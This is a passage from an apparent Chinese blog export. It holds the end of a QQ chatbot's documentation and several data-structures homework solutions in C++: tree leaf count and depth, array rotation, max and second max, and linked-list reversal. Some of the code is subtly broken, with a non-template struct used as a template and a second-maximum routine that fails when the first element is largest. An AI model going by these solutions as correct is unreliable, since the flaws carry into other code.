class="line">在&lt;消息&gt;这个参数中，可以附带一些指定的标记，程序会将这些标记替换成相应的结果：</span><br><span class="line">当前年：&#123;year&#125;</span><br><span class="line">当前月：&#123;month&#125;</span><br><span class="line">当前日：&#123;day&#125;</span><br><span class="line">换行：&#123;n&#125;</span><br><span class="line">如：</span><br><span class="line">/sendgroupmessage 123456 今天是&#123;year&#125;年&#123;month&#125;月&#123;day&#125;日！&#123;n&#125;大家好啊！</span><br><span class="line">-------------------</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="管理模式"><a href="#管理模式" class="headerlink" title="管理模式"></a>管理模式</h2><ul>
<li>词库管理：模糊 <code>搜索/查看/删除</code> <code>所有群/指定群</code> 的词库</li>
<li>过滤：自定义无用关键词，也可以通过在删除答案时前加<code>add</code>来直接添加进过滤列表</li>
<li>黑名单：自定义敏感关键词，不记录且将对象拉入黑名单，用 <code>blackfreq <次数></code> 自定义容错次数。</li>
<li>自动清理词库：删除词库中仅出现过单次的条目和被过滤的条目</li>
<li>添加定时任务：使用定时任务定义的语法添加定时任务</li>
<li>添加自定义回复：为词库添加回复，问答皆可除视频、文件任意形式的消息(只要QQ能发出来)，同时为答案定义<strong>权重(词库中每个答案都有一个权重，意为答案出现过的次数)</strong></li>
</ul>
<h2 id="文字转语音"><a href="#文字转语音" class="headerlink" title="文字转语音"></a><strong>文字转语音</strong></h2><p><a class="link"   href="https://github.com/Nana-Miko/ChatLearning/blob/master/ToVoice/ToVoice.md" >ChatLearning—ToVoice<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<h2 id="Q-A"><a href="#Q-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p><strong>Q：ChatLearning</strong>的功能是什么？</p>
<p><strong>A：ChatLearning</strong>可以自动的从群聊中收集聊天记录，并且将这些聊天记录整理成一个<strong>问&amp;答</strong>的词库，当有人发送的消息与词库中的”<strong>问</strong>“匹配时，会从“<strong>答</strong>”中随机抽取其中一个回复在群聊中</p>
<hr>
<p><strong>Q</strong>：打开软件后，我应该如何使用？</p>
<p><strong>A</strong>：首先应添加需要bot记录的群号，然后开启记录功能（输入<code>help</code>可查看到对应指令）</p>
<hr>
<p><strong>Q</strong>：要收集多久bot才会开始回复呢？</p>
<p><strong>A</strong>：收集的时间完全由自己决定，理论上时间越久，效果会更好且更加有趣</p>
<hr>
<p><strong>Q</strong>：我要怎么才能让bot回复？</p>
<p><strong>A</strong>：首先应添加需要bot回复的群号，然后开启回复功能（输入<code>help</code>可查看到对应指令）</p>
<hr>
<p><strong>Q</strong>：目录下的<code>.cl</code>和<code>.clc</code>文件是什么，我可以删除它吗？</p>
<p><strong>A</strong>：<code>.cl</code>文件是<strong>ChatLearning</strong>所缓存在本地的词库，它的文件名就是所对应的QQ群号，如果你觉得不需要这个词库了，可以在<strong>ChatLearning</strong>退出后将它删除。<code>.clc</code>文件是<strong>ChatLearning</strong>的配置文件，删除后<strong>ChatLearning</strong>会随即崩溃</p>
<hr>
<p><strong>Q</strong>：目录下的<code>.cl</code>文件太大太占空间了怎么办？</p>
<p><strong>A</strong>：一般来说不是每天都隔一会99+的群聊，是不会很占空间的， 目前只能选择进入管理模式手动清理一些不需要的回复，后续会更新根据记录的时间批量删除</p>
]]></content>
      <categories>
        <category>QQbot</category>
      </categories>
      <tags>
        <tag>QQbot</tag>
      </tags>
  </entry>
  <entry>
    <title>DS 作业-6-Ch5-22 网安物联网-20231024</title>
    <url>/posts/7e0c0400.html</url>
    <content><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这次老师直接用PDF发题，我直接搬过来了，加密环境下图片加载不出来直接点开看</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/DS-homework/DS-homework-6-Ch5-22wanganwulian-20231024.jpg"
                      alt="题目"
                ></p>
<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>题解懒得打字了，直接把图搬过来，除了最后两个题，前面题目不能保证准确率，因为是我自己做的</p>
<h2 id="第一题"><a href="#第一题" class="headerlink" title="第一题"></a>第一题</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/DS-homework/DS-homework-6-Ch5-22wanganwulian-20231024-1.jpg"
                      alt="第一题"
                ></p>
<h2 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/DS-homework/DS-homework-6-Ch5-22wanganwulian-20231024-2.jpg"
                      alt="第二题"
                ></p>
<h2 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/DS-homework/DS-homework-6-Ch5-22wanganwulian-20231024-3.jpg"
                      alt="第三题"
                ></p>
<h2 id="第四题"><a href="#第四题" class="headerlink" title="第四题"></a>第四题</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/DS-homework/DS-homework-6-Ch5-22wanganwulian-20231024-4.jpg"
                      alt="第四题"
                ></p>
<h2 id="第五题"><a href="#第五题" class="headerlink" title="第五题"></a>第五题</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../images/DS-homework/DS-homework-6-Ch5-22wanganwulian-20231024-5.jpg"
                      alt="第五题"
                ></p>
<h2 id="第六题"><a href="#第六题" class="headerlink" title="第六题"></a>第六题</h2><p>这是一个使用递归的方法来计算二叉树中叶子节点的个数的算法。在这个算法中，我们首先检查当前节点是否为空，如果为空则返回0。然后，我们检查当前节点是否是叶子节点，如果是，则返回1。否则，我们递归地对左子树和右子树进行相同的操作，并将结果相加。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BiTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiNode</span> &#123;</span><br><span class="line">        DataType data;</span><br><span class="line">        BiNode* left;</span><br><span class="line">        BiNode* right;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">BiTreeLeaf</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bt == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bt-&gt;left == <span class="literal">nullptr</span> &amp;&amp; bt-&gt;right == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">BiTreeLeaf</span>(bt-&gt;left) + <span class="built_in">BiTreeLeaf</span>(bt-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这个函数<code>BiTreeLeaf</code>接收一个指向<code>BiNode</code>的指针作为参数，并返回一个整数，表示二叉树中叶子节点的个数。请注意，这个函数是<code>BiTree</code>类的成员函数，所以你需要在一个<code>BiTree</code>对象上调用它。例如，如果你有一个<code>BiTree&lt;int&gt;</code>对象<code>tree</code>，你可以这样调用它：<code>tree.BiTreeLeaf(root)</code>，其中<code>root</code>是指向树根的指针。这个函数会递归地遍历整棵树，并计算叶子节点的个数。当它访问到一个叶子节点时，它就会返回1；否则，它就会返回其左右子树中叶子节点的个数之和。这就是递归的魅力！</p>
<h2 id="第七题"><a href="#第七题" class="headerlink" title="第七题"></a>第七题</h2><p>这是一个使用递归的方法来计算二叉树的深度的算法。在这个算法中，我们首先检查当前节点是否为空，如果为空则返回0。然后，我们递归地对左子树和右子树进行相同的操作，并返回结果中的最大值加1。</p>
<div class="code-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BiTree</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">BiNode</span> &#123;</span><br><span class="line">        DataType data;</span><br><span class="line">        BiNode* left;</span><br><span class="line">        BiNode* right;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">BiDepth</span><span class="params">(BiNode&lt;DataType&gt;* bt)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (bt == <span class="literal">nullptr</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> leftDepth = <span class="built_in">BiDepth</span>(bt-&gt;left);</span><br><span class="line">        <span class="type">int</span> rightDepth = <span class="built_in">BiDepth</span>(bt-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(leftDepth, rightDepth) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>这个函数<code>BiDepth</code>接收一个指向<code>BiNode</code>的指针作为参数，并返回一个整数，表示二叉树的深度。请注意，这个函数是<code>BiTree</code>类的成员函数，所以你需要在一个<code>BiTree</code>对象上调用它。例如，如果你有一个<code>BiTree&lt;int&gt;</code>对象<code>tree</code>，你可以这样调用它：<code>tree.BiDepth(root)</code>，其中<code>root</code>是指向树根的指针。这个函数会递归地遍历整棵树，并计算树的深度。当它访问到一个节点时，它就会返回其左右子树中深度较大的一个加上1。这就是递归的魅力！</p>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>课后作业</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>DS作业-2-22网安物联网-20230913</title>
    <url>/posts/cab65f6a.html</url>
    <content><![CDATA[<blockquote>
<p>声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬</p>
</blockquote>
<h1 id="DS作业-2-22网安物联网-20230913"><a href="#DS作业-2-22网安物联网-20230913" class="headerlink" title="DS作业-2-22网安物联网-20230913"></a><strong>DS作业-2-22网安物联网-20230913</strong></h1><p><strong>作业Ch1-4:  P24-P25 1.选择题</strong></p>
<p>1-5  <u>CD</u>    B  B A A   6-9  C  <u>CE</u>  </p>
<p>第九题解析</p>
<blockquote>
<p>这段代码的时间复杂度是O(n²)。这是因为外部循环会执行n次，而内部循环会执行2<em>i次，其中i的最大值是n。因此，最坏情况下，内部循环会执行2n次。所以，总的执行次数是n</em>(2n)，即O(n²)。这意味着，如果输入大小（即n的值）增加，那么执行时间将按平方增加。这是典型的二次时间复杂度的例子。</p>
</blockquote>
<h1 id="作业Ch1-5"><a href="#作业Ch1-5" class="headerlink" title="作业Ch1-5:"></a><strong>作业Ch1-5:</strong></h1><p><strong>算法编程题，给出代码、测试过程和运行结果：</strong></p>
<p><font color='red'>这个题存疑，算法思路还没看懂</font></p>
<p>将一个具有 n 个元素的数组A[n]向左循环移动k个位置，要求时间复杂度为O(n)，空间复杂度为O(1)。</p>
<blockquote>
<p>答案（来自bing ai</p>
</blockquote>
<p>这是一个经典的问题，可以通过三次反转数组的方法来解决。首先，我们将数组的前k个元素反转，然后将剩余的元素反转，最后将整个数组反转。这样就可以实现将数组向左循环移动k个位置。以下是具体的C++代码实现：</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reverse</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> start, <span class="type">int</span> end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(start &lt; end) &#123;</span><br><span class="line">        <span class="built_in">swap</span>(A[start], A[end]);</span><br><span class="line">        start++;</span><br><span class="line">        end--;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">leftRotate</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">reverse</span>(A, <span class="number">0</span>, k<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">reverse</span>(A, k, n<span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">reverse</span>(A, <span class="number">0</span>, n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> A[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">sizeof</span>(A)/<span class="built_in">sizeof</span>(A[<span class="number">0</span>]);</span><br><span class="line">    <span class="type">int</span> k = <span class="number">2</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">leftRotate</span>(A, n, k);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        cout &lt;&lt; A[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码首先定义了一个<code>reverse</code>函数，用于反转数组中从<code>start</code>到<code>end</code>的元素。然后定义了一个<code>leftRotate</code>函数，用于将数组向左循环移动k个位置。在<code>main</code>函数中，我们创建了一个数组，并调用了<code>leftRotate</code>函数来进行旋转。最后，我们打印出旋转后的数组。</p>
<p>这个解决方案的时间复杂度为O(n)，空间复杂度为O(1)，满足了题目的要求。希望这个答案对你有所帮助！</p>
<p><font color='red'>新知识，要使其不大于最大长度可以用取模运算来解决</font></p>
<h2 id="作业Ch1-6"><a href="#作业Ch1-6" class="headerlink" title="作业Ch1-6:"></a><strong>作业Ch1-6:</strong></h2><p><strong>算法编程题，给出代码、测试过程和运行结果：</strong></p>
<p>找出整型数组A[n]中的最大值和次最大值。</p>
<blockquote>
<p>答案（来自bing ai</p>
</blockquote>
<p>以下是一个C++代码片段，它可以找出整型数组A[n]中的最大值和次最大值。这个代码假设数组中至少有两个元素，并且所有元素都是唯一的。</p>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">findMaxAndSecondMax</span><span class="params">(<span class="type">int</span> A[], <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> max1 = A[<span class="number">0</span>], max2 = A[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(A[i] &gt; max1) &#123;</span><br><span class="line">            max2 = max1;</span><br><span class="line">            max1 = A[i];</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(A[i] &gt; max2) &#123;</span><br><span class="line">            max2 = A[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;最大值: &quot;</span> &lt;&lt; max1 &lt;&lt; <span class="string">&quot;, 次最大值: &quot;</span> &lt;&lt; max2 &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> A[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;;</span><br><span class="line">    <span class="type">int</span> n = <span class="built_in">sizeof</span>(A)/<span class="built_in">sizeof</span>(A[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">findMaxAndSecondMax</span>(A, n);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这段代码首先定义了一个<code>findMaxAndSecondMax</code>函数，用于找出数组中的最大值和次最大值。然后在<code>main</code>函数中，我们创建了一个数组，并调用了<code>findMaxAndSecondMax</code>函数来找出最大值和次最大值。希望这个答案对你有所帮助！</p>
<h1 id="END"><a href="#END" class="headerlink" title="END"></a>END</h1>]]></content>
      <categories>
        <category>学习笔记</category>
        <category>数据结构作业</category>
        <category>课后作业</category>
      </categories>
      <tags>
        <tag>数据结构作业</tag>
      </tags>
  </entry>
  <entry>
    <title>DS作业-3-Ch2-22网安物联网-20230927</title>
    <url>/posts/bd11f2f0.html</url>
    <content><![CDATA[<blockquote>
<p>声明：仅供留档查阅，仅用作起到提示引导性作用，仅用作学习交流，切勿直接照搬</p>
</blockquote>
<h1 id="作业Ch2-1"><a href="#作业Ch2-1" class="headerlink" title="作业Ch2-1:"></a>作业Ch2-1:</h1><p><strong>总结单链表中引入头节点的原因？</strong></p>
<p>为了使操作方便，加了头结点之后，无论单链表是否为空，头指针始终指向头节点，因此空表和非空表的处理也统一了</p>
<h1 id="作业Ch2-2"><a href="#作业Ch2-2" class="headerlink" title="作业Ch2-2:"></a>作业Ch2-2:</h1><p><strong>编程题目，逆置一个单链表为一个新表，编制源代码并运行。</strong></p>
<blockquote>
<p><del class="mask">没用ai跑，自己写的，实际上原理就是头插法和尾插法，两个方法的顺序是相反的</del></p>
<p>重做了，原来的做法不符题意，虽然功能是一样的，新做法的思路↓</p>
</blockquote>
<blockquote>
<p><code>nizhi</code>函数的原理是通过改变链表中节点的链接顺序来实现链表的反转。</p>
<p>具体步骤如下：</p>
<ol>
<li>初始化：创建一个新的空链表（只有头节点，头节点的<code>next</code>指针为<code>nullptr</code>）。</li>
<li>遍历原链表：从原链表的第一个节点开始，每次处理一个节点。</li>
<li>插入新链表：将当前处理的节点插入到新链表的头节点之后。具体操作是先将当前节点的<code>next</code>指针指向新链表的第一个节点，然后再将头节点的<code>next</code>指针指向当前节点。</li>
<li>移动到下一个节点：保存下一个要处理的节点的位置，然后将当前节点从原链表中断开（也就是将当前节点的<code>next</code>指针置为<code>nullptr</code>），最后移动到下一个要处理的节点。</li>
<li>重复步骤3和4，直到原链表中所有的节点都被处理完毕。</li>
</ol>
<p>这样，原链表中的节点就被逐个移动到了新链表中，并且在新链表中的顺序与在原链表中的顺序相反，从而实现了链表的反转。这个过程中，我们没有创建任何新的节点，只是改变了已有节点之间的链接关系。因此，这个函数的时间复杂度为O(n)，空间复杂度为O(1)。</p>
</blockquote>
<div class="code-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Node</span></span><br><span class="line">&#123;</span><br><span class="line">    DataType data;</span><br><span class="line">    Node&lt;DataType&gt;* next;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">linklist</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">linklist</span>();</span><br><span class="line">    <span class="built_in">linklist</span>(DataType a[], <span class="type">int</span> n);</span><br><span class="line">    ~<span class="built_in">linklist</span>();</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">nizhi</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">()</span></span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    Node&lt;DataType&gt;* first;<span class="comment">//头结点</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">linklist&lt;DataType&gt;::<span class="built_in">linklist</span>()</span><br><span class="line">&#123;</span><br><span class="line">    first = <span class="keyword">new</span> Node&lt;DataType&gt;;</span><br><span class="line">    first-&gt;next = <span class="literal">nullptr</span>;<span class="comment">//头结点指针置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line">linklist&lt;DataType&gt;::<span class="built_in">linklist</span>(DataType a[], <span class="type">int</span> n)</span><br><span class="line">&#123;</span><br><span class="line">    first = <span class="keyword">new</span> Node&lt;DataType&gt;;              <span class="comment">// 生成头结点</span></span><br><span class="line">    Node&lt;DataType&gt;* r = first, * s = <span class="literal">nullptr</span>; <span class="comment">// 尾指针初始化</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s = <span class="keyword">new</span> Node&lt;DataType&gt;;</span><br><span class="line">        s-&gt;data = a[i];</span><br><span class="line">        r-&gt;next = s;</span><br><span class="line">        r = s; <span class="comment">// 将结点s插入到终端结点之后</span></span><br><span class="line">    &#125;</span><br><span class="line">    r-&gt;next = <span class="literal">nullptr</span>; <span class="comment">// 单链表建立完毕，将终端结点的指针域置空</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> linklist&lt;DataType&gt;::<span class="built_in">nizhi</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next;</span><br><span class="line">    Node&lt;DataType&gt;* q;</span><br><span class="line">    first-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q = p-&gt;next; <span class="comment">// 保存下一个节点的位置</span></span><br><span class="line">        p-&gt;next = first-&gt;next; <span class="comment">// 将当前节点插入到头节点之后</span></span><br><span class="line">        first-&gt;next = p;</span><br><span class="line">        p = q; <span class="comment">// 移动到下一个节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> DataType&gt;</span><br><span class="line"><span class="type">void</span> linklist&lt;DataType&gt;::<span class="built_in">display</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* p = first-&gt;next;</span><br><span class="line">    <span class="keyword">while</span> (p != <span class="literal">nullptr</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; p-&gt;data &lt;&lt; <span class="string">&quot;\t&quot;</span>;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">class</span> <span class="title class_">DataType</span>&gt;</span><br><span class="line">linklist&lt;DataType&gt;::~<span class="built_in">linklist</span>()</span><br><span class="line">&#123;</span><br><span class="line">    Node&lt;DataType&gt;* q = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">while</span> (first != <span class="literal">NULL</span>) <span class="comment">// 释放单链表的每一个结点的存储空间</span></span><br><span class="line">    &#123;</span><br><span class="line">        q = first;           <span class="comment">// 暂存被释放结点</span></span><br><span class="line">        first = first-&gt;next; <span class="comment">// first指向被释放结点的下一个结点</span></span><br><span class="line">        <span class="keyword">delete</span> q;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                   _ooOoo_</span></span><br><span class="line"><span class="comment">                  o8888888o</span></span><br><span class="line"><span class="comment">                  88&quot; . &quot;88</span></span><br><span class="line"><span class="comment">                  (| -_- |)</span></span><br><span class="line"><span class="comment">                  O\  =  /O</span></span><br><span class="line"><span class="comment">               ____/`---&#x27;\____</span></span><br><span class="line"><span class="comment">            .&#x27;  \\|     |//  `.</span></span><br><span class="line"><span class="comment">            /  \\|||  :  |||//  \</span></span><br><span class="line"><span class="comment">           /  _||||| -:- |||||-  \</span></span><br><span class="line"><span class="comment">           |   | \\\  -  /// |   |</span></span><br><span class="line"><span class="comment">           | \_|  &#x27;&#x27;\---/&#x27;&#x27;  |   |</span></span><br><span class="line"><span class="comment">           \  .-\__  `-`  ___/-. /</span></span><br><span class="line"><span class="comment">         ___`. .&#x27;  /--.--\  `. . __</span></span><br><span class="line"><span class="comment">      .&quot;&quot; &#x27;&lt;  `.___\_&lt;|&gt;_/___.&#x27;  &gt;&#x27;&quot;&quot;.</span></span><br><span class="line"><span class="comment">     | | :  `- \`.;`\ _ /`;.`/ - ` : | |</span></span><br><span class="line"><span class="comment">     \  \ `-.   \_ __\ /__ _/   .-` /  /</span></span><br><span class="line"><span class="comment">======`-.____`-.___\_____/___.-`____.-&#x27;======</span></span><br><span class="line"><span class="comment">                   `=---=&#x27;</span></span><br><span class="line"><span class="comment">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</span></span><br><span class="line"><span class="comment">    佛祖保佑       永不宕机     永无BUG</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> maxsize;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;请输入你要创建数组的大小&quot;</span> &lt;&lt; endl;</span><br><span class="line">    cin &gt;&gt; maxsize;</span><br><span class="line">    <span class="type">int</span>* a = <span class="keyword">new</span> <span class="type">int</span>[maxsize];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; maxsize; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        a[i] = i + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;已创建一个最大长度&quot;</span> &lt;&lt; maxsize &lt;&lt; <span class="string">&quot;的链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    linklist&lt;<span class="type">int</span>&gt; L&#123; a, maxsize &#125;;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;执行遍历链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">display</span>();</span><br><span class="line">    cout &lt;&lt; endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;下面逆置最大长度为&quot;</span> &lt;&lt; maxsize &lt;&lt; <span class="string">&quot;的链表&quot;</span> &lt;&lt; endl;</span><br><span class="line">    L.<span class="built_in">nizhi</span>();</span><br><span class="line">    L.<span class="built_in">display</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="作业Ch2-3"><a href="#作业Ch2-3" class="headerlink" title="作业Ch2-3:"></a>作业Ch2-3:</h1><p><strong>教材P66, 2(1)题：请说明顺序表和单链表有何优缺点？并分析不同情况下采用何种存储结构更合适？</strong></p>
<p>顺序表的优点:① 无需为表示表中元素之间的逻辑关系而增加额外的存储空间;② 可以快速地存取表中任一位置的元素(即随机存取)。</p>
<p>顺序表的缺点:① 插入和删除操作需移动大量元素;② 表的容量难以确定;③ 造成存储空间的“碎片”。</p>
<p>单链表的优点:① 不必事先知道线性表的长度;② 插入和删除元素时只需修改指针,不用移动元素。</p>
<p>单链表的缺点:① 指针的结构性开销;② 存取表中任意元素不方便,只能进行顺序存取。</p>
<p>⑴ 应选用顺序存储结构。因为顺序表是随机存取结构,单链表是顺序存取结构。本题很少进行插入和删除操作,所以空间变化不大,且需要快速存取,所以应选用顺序存储结构。</p>
<p>⑵ 应选用链接存储结构。链表容易实现表容量的扩充,适合表的长度动态发生变化。⑶ 应选用链接存储结构。因为一个城市的设计和规划涉及活动很多,需要经常修改、扩充和删除各种信息, 才能适应不断发展的需要。而顺序表的插入、删除的效率低,故不合适。</p>
<h1 id="作业Ch2-4"><a href="#作业Ch2-4" class="headerlink" title="作业Ch2-4:"></a>作业Ch2-4:</h1><p><strong>算法设计：在顺序表中删除所有元素值为x的元素，要求空间复杂度为O(1)，给出算法伪代码和源代码。</strong></p>
<blockquote>
<p>ai加自己写的，有两个方法，第一个方法比较好一些</p>
</blockquote>
